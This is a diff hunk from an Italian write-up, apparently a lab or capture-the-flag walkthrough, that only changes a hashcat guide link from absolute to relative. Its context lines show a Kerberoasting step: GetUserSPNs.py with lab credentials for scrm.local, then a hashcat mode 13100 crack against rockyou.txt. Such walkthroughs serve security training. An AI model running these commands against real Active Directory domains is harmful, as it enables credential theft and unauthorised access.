@@ -157,7 +157,7 @@ GetUserSPNs.py scrm.local/ksimpson:ksimpson \
 
 Si ottiene hash TGS per `sqlsvc` (SPN: `MSSQLSvc/DC1.scrm.local:1433`).
 
-Crack con hashcat (modalità 13100, guida su [hashcat per password cracking](https://hackita.it/articoli/hashcat/)):
+Crack con hashcat (modalità 13100, guida su [hashcat per password cracking](/articoli/hashcat/)):
 
 ```bash
 hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
